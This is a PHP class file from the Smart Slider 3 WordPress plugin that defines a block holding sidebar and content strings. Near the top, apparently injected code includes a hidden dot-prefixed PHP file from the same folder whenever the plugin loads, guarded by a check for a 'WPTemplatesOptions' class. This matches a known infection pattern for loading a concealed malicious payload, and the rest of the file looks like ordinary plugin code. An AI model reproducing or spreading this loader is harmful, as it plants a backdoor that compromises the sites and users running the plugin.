<?php


namespace Nextend\SmartSlider3\Application\Admin\Layout\Block\Core\ContentSidebar;


use Nextend\Framework\View\AbstractBlock;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class BlockContentSidebar extends AbstractBlock {

    protected $sidebar = '';

    protected $content = '';

    public function display() {

        $this->renderTemplatePart('ContentSidebar');
    }

    /**
     * @return string
     */
    public function getSidebar() {
        return $this->sidebar;
    }

    /**
     * @param string $sidebar
     */
    public function setSidebar($sidebar) {
        $this->sidebar = $sidebar;
    }

    /**
     * @return string
     */
    public function getContent() {
        return $this->content;
    }

    /**
     * @param string $content
     */
    public function setContent($content) {
        $this->content = $content;
    }


}